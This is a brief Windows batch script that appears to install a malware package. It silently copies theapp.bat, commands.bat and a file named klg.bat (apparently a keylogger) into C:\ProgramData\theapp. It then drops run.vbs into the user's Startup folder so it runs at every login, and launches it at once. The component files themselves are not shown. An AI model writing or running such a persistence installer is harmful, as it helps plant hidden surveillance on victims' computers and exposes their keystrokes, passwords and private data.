@echo off
cd /d %~dp0
mkdir "C:\ProgramData\theapp"
copy theapp.bat "C:\ProgramData\theapp\"
copy klg.bat "C:\ProgramData\theapp\"
copy commands.bat "C:\ProgramData\theapp\"
copy run.vbs "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
cscript run.vbs